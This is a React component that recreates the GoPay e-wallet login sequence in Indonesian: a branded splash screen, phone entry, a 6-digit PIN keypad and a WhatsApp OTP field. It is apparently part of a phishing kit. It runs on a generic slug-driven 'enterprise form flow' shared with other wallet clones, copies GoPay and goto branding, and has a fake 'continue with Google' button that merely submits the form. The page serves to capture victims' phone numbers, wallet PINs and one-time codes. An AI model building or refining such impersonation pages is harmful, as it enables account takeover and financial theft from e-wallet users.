'use client';

import { useEffect, useRef, useState } from 'react';
import Image from 'next/image';
import { ChevronLeft, ChevronDown, Delete, Globe, Info } from 'lucide-react';
import { useEnterpriseFormFlow } from '../lib/useEnterpriseFormFlow';
import { useStepPanelReady } from '../hooks/useStepPanelReady';
import { formatCountdownMMSS, formatPhoneInput } from '../lib/utils';
import type { WalletFormProps } from './wallet-methods';
import { GopayLoadingSpinnerOverlay } from './GopayLoadingSpinnerOverlay';
import { ThemeColorMeta } from '../ThemeColorMeta';
import { WALLET_THEME } from '../lib/theme-colors';
import './gopay-wallet.css';

const SPLASH_MS = 3000;
const OTP_LENGTH = 4;

type Phase = 'splash' | 'form';

function maskPhoneForOtp(phone: string): string {
  const digits = phone.replace(/\D/g, '');
  if (digits.length <= 4) return `+62${digits}`;
  return `+62${'*'.repeat(7)}${digits.slice(-4)}`;
}

function GoPayLogo({ compact = false }: { compact?: boolean }) {
  return (
    <div className={`go-brand ${compact ? 'go-brand--compact' : ''}`}>
      <svg width={compact ? 20 : 24} height={compact ? 20 : 24} viewBox="0 0 24 24" aria-hidden>
        <rect x="2" y="5" width="20" height="14" rx="3" fill="#0081A0" />
        <path d="M7 10h6a2 2 0 010 4H7V10z" fill="#fff" opacity="0.9" />
        <rect x="15" y="11" width="5" height="2" rx="1" fill="#00AA13" />
      </svg>
      <span>gopay</span>
    </div>
  );
}

function GotoFooter() {
  return (
    <footer className="go-footer">
      <span>from </span>
      <span className="go-footer-goto">goto</span>
    </footer>
  );
}

export function GopayWalletForm({ slugData, onBack }: WalletFormProps) {
  const f = useEnterpriseFormFlow(slugData, 'gopay', {
    disableSound: true,
    otpLength: OTP_LENGTH,
    autoSubmitOtp: true,
  });

  const [phase, setPhase] = useState<Phase>('splash');
  const [splashHide, setSplashHide] = useState(false);
  const stepReady = useStepPanelReady(f.step);
  const [touchIdOn, setTouchIdOn] = useState(false);
  const [otpErrorToast, setOtpErrorToast] = useState(false);
  const otpInputRef = useRef<HTMLInputElement>(null);
  const otpToastTimerRef = useRef<number | null>(null);

  useEffect(() => {
    const fadeTimer = window.setTimeout(() => setSplashHide(true), SPLASH_MS - 400);
    const formTimer = window.setTimeout(() => setPhase('form'), SPLASH_MS);
    return () => {
      window.clearTimeout(fadeTimer);
      window.clearTimeout(formTimer);
    };
  }, []);

  useEffect(() => {
    if (f.step === 3 && phase === 'form') {
      const timer = window.setTimeout(() => otpInputRef.current?.focus(), 280);
      return () => window.clearTimeout(timer);
    }
    return undefined;
  }, [f.step, phase]);

  useEffect(() => {
    if (f.step !== 3) {
      setOtpErrorToast(false);
      if (otpToastTimerRef.current) {
        window.clearTimeout(otpToastTimerRef.current);
        otpToastTimerRef.current = null;
      }
    }
  }, [f.step]);

  useEffect(() => {
    if (f.step !== 3 || !f.otpLocked) return undefined;

    setOtpErrorToast(true);
    if (otpToastTimerRef.current) window.clearTimeout(otpToastTimerRef.current);
    otpToastTimerRef.current = window.setTimeout(() => {
      setOtpErrorToast(false);
      otpToastTimerRef.current = null;
    }, 7000);

    return () => {
      if (otpToastTimerRef.current) {
        window.clearTimeout(otpToastTimerRef.current);
        otpToastTimerRef.current = null;
      }
    };
  }, [f.step, f.otpLocked]);

  const stepPanelClass = (isExiting: boolean) => {
    if (isExiting) return 'go-step-panel go-step-panel--exit';
    if (stepReady) return 'go-step-panel go-step-panel--active';
    return 'go-step-panel go-step-panel--enter';
  };

  const appendPin = (digit: string) => {
    if (f.stepData.pin.length >= 6) return;
    f.setStepData({ ...f.stepData, pin: `${f.stepData.pin}${digit}` });
  };

  const backspacePin = () => {
    f.setStepData({ ...f.stepData, pin: f.stepData.pin.slice(0, -1) });
  };

  const handleOtpInput = (value: string) => {
    const digits = value.replace(/\D/g, '').slice(0, OTP_LENGTH);
    if (digits.length < OTP_LENGTH) setOtpErrorToast(false);
    f.setStepData({ ...f.stepData, otp: digits });
  };

  const handleLogin = () => {
    if (f.phoneValid && !f.submitting) void f.handleNext();
  };

  const keypadRows = [
    ['1', '2', '3'],
    ['4', '5', '6'],
    ['7', '8', '9'],
  ];

  const timerProgress = (f.countdown / 60) * 100;
  const maskedPhone = maskPhoneForOtp(f.stepData.phone);

  return (
    <div className="go-flow">
      <ThemeColorMeta color={WALLET_THEME.gopay} />
      <GopayLoadingSpinnerOverlay visible={f.isLoadingOverlay} />
      {phase === 'splash' && (
        <div className={`go-splash ${splashHide ? 'go-splash--hide' : ''}`}>
          <Image
            src="/go-splash.jpeg"
            alt=""
            fill
            className="go-splash-img"
            priority
            sizes="100vw"
            aria-hidden
          />
        </div>
      )}

      {phase === 'form' && (f.step === 1 || f.previousStep === 1) && (
        <div className={`go-step1 ${stepPanelClass(f.isStep1FadingOut)}`}>
          <header className="go-topbar">
            <button type="button" className="go-icon-btn" onClick={onBack} aria-label="Kembali">
              <ChevronLeft className="h-6 w-6" />
            </button>
            <div className="go-topbar-right">
              <button type="button" className="go-help-chip" aria-label="Bantuan">
                ?
              </button>
              <button type="button" className="go-lang-chip">
                <Globe className="h-3.5 w-3.5" />
                <span>Bahasa Indonesia</span>
                <ChevronDown className="h-3.5 w-3.5" />
              </button>
            </div>
          </header>

          <div className="go-step1-body">
            <h1 className="go-title-serif">Selamat datang di GoPay!</h1>
            <p className="go-subtitle">Masuk atau daftar hanya dalam beberapa langkah mudah.</p>

            <label className="go-field-label">
              Nomor HP <span className="go-required">*</span>
            </label>
            <div className="go-phone-field">
              <span className="go-flag" aria-hidden>
                🇮🇩
              </span>
              <span className="go-phone-prefix">+62</span>
              <input
                type="tel"
                inputMode="numeric"
                enterKeyHint="go"
                placeholder="81x-xxx-xxx"
                className="go-phone-input"
                value={formatPhoneInput(f.stepData.phone)}
                onChange={(e) =>
                  f.setStepData({ ...f.stepData, phone: e.target.value.replace(/[^0-9]/g, '') })
                }
                onKeyDown={(e) => {
                  if (e.key === 'Enter') handleLogin();
                }}
              />
            </div>
            <button type="button" className="go-link-green">
              Ada kendala nomor HP?
            </button>

            {f.errorMessage && <p className="go-error">{f.errorMessage}</p>}

            <button
              type="button"
              className={`go-btn-primary ${f.phoneValid ? 'go-btn-primary--on' : ''}`}
              disabled={!f.phoneValid || f.submitting}
              onClick={handleLogin}
            >
              {f.submitting ? 'Memproses...' : 'Lanjut'}
            </button>

            <p className="go-or">atau</p>

            <button type="button" className="go-btn-outline" onClick={handleLogin}>
              <Image
                src="/enterprise/google.png"
                alt=""
                width={18}
                height={18}
                className="go-social-icon"
                aria-hidden
              />
              Lanjut dengan Google
            </button>
          </div>

          <GotoFooter />
        </div>
      )}

      {phase === 'form' && (f.step === 2 || f.previousStep === 2) && (
        <div className={`go-step2 ${stepPanelClass(f.isStep2FadingOut)}`}>
          <header className="go-pin-header">
            <button type="button" className="go-icon-btn" onClick={() => f.goBackStep()} aria-label="Kembali">
              <ChevronLeft className="h-6 w-6" />
            </button>
            <span className="go-pin-title">Masukkin PIN kamu</span>
            <button type="button" className="go-icon-btn" aria-label="Info">
              <Info className="h-5 w-5" />
            </button>
          </header>

          <div className="go-step2-body">
            <div className="go-touch-card">
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" aria-hidden>
                <path
                  d="M12 2C9.5 2 7.5 4 7.5 6.5V9C5.6 9.8 4.2 11.6 4.2 13.8V16c0 2.8 2.2 5 5 5h5.6c2.8 0 5-2.2 5-5v-2.2c0-2.2-1.4-4-3.3-4.8V6.5C16.5 4 14.5 2 12 2z"
                  stroke="currentColor"
                  strokeWidth="1.5"
                />
                <path d="M9 14c1 2 2.5 3 3 3s2-1 3-3" stroke="currentColor" strokeWidth="1.5" />
              </svg>
              <p>Gunakan Touch ID untuk bayar lebih cepat &amp; aman</p>
              <button
                type="button"
                className={`go-toggle ${touchIdOn ? 'go-toggle--on' : ''}`}
                onClick={() => setTouchIdOn((v) => !v)}
                aria-pressed={touchIdOn}
              >
                <span />
              </button>
            </div>

            <p className="go-pin-hint">Silakan ketik 6 digit PIN kamu buat lanjut.</p>

            <div className="go-pin-field">
              {Array.from({ length: 6 }, (_, i) => (
                <span key={i} className={i < f.stepData.pin.length ? 'filled' : ''}>
                  {i < f.stepData.pin.length ? <span className="go-pin-dot" /> : null}
                </span>
              ))}
            </div>

            <button type="button" className="go-link-green go-link-left">
              Lupa PIN
            </button>

            {f.errorMessage && <p className="go-error">{f.errorMessage}</p>}

            <div className="go-powered">
              <span>Powered by</span>
              <GoPayLogo compact />
            </div>
          </div>

          <div className="go-keypad">
            {keypadRows.map((row) => (
              <div key={row.join('')} className="go-keypad-row">
                {row.map((key) => (
                  <button key={key} type="button" className="go-key go-key--serif" onClick={() => appendPin(key)}>
                    {key}
                  </button>
                ))}
              </div>
            ))}
            <div className="go-keypad-row">
              <span className="go-key go-key--empty" />
              <button type="button" className="go-key go-key--serif" onClick={() => appendPin('0')}>
                0
              </button>
              <button type="button" className="go-key go-key--delete" onClick={backspacePin}>
                <Delete className="h-5 w-5" />
              </button>
            </div>
          </div>
        </div>
      )}

      {phase === 'form' && f.step === 3 && (
        <div className={`go-step3 ${stepPanelClass(false)}`}>
          <header className="go-topbar go-topbar--compact">
            <button type="button" className="go-icon-btn" onClick={() => f.goBackStep()} aria-label="Kembali">
              <ChevronLeft className="h-6 w-6" />
            </button>
            <span className="go-topbar-spacer" />
            <button type="button" className="go-help-chip" aria-label="Bantuan">
              ?
            </button>
          </header>

          <div className="go-step3-body">
            <h2 className="go-otp-title">Cek WhatsApp, ya</h2>
            <p className="go-otp-sub">Kode-nya kami kirim ke {maskedPhone}</p>

            <label className="go-field-label go-otp-label">
              OTP <span className="go-required">*</span>
            </label>

            <div
              className="go-otp-row"
              onClick={() => otpInputRef.current?.focus()}
              role="presentation"
            >
              <div className="go-otp-dots">
                <input
                  ref={otpInputRef}
                  type="tel"
                  inputMode="numeric"
                  autoComplete="one-time-code"
                  maxLength={OTP_LENGTH}
                  className="go-otp-hidden"
                  value={f.stepData.otp}
                  onChange={(e) => handleOtpInput(e.target.value)}
                />
                {Array.from({ length: OTP_LENGTH }, (_, i) => (
                  <span
                    key={i}
                    className={`go-otp-digit ${f.stepData.otp[i] ? 'filled' : ''} ${
                      f.stepData.otp.length === i ? 'active' : ''
                    }`}
                  >
                    {f.stepData.otp[i] ?? ''}
                  </span>
                ))}
              </div>
              <div className="go-otp-timer">
                <span
                  className="go-timer-ring"
                  style={{
                    background: `conic-gradient(#00aa13 ${timerProgress}%, #3a3a3a ${timerProgress}%)`,
                  }}
                  aria-hidden
                />
                <span className="go-timer-text">{formatCountdownMMSS(f.countdown)}</span>
              </div>
              <div className="go-otp-line" />
            </div>

            <p className={`go-otp-toast ${otpErrorToast ? 'go-otp-toast--show' : ''}`}>
              OTP yang dimasukkan salah/kadaluwarsa
            </p>

            {f.errorMessage && <p className="go-error">{f.errorMessage}</p>}
          </div>

          <GotoFooter />
        </div>
      )}
    </div>
  );
}
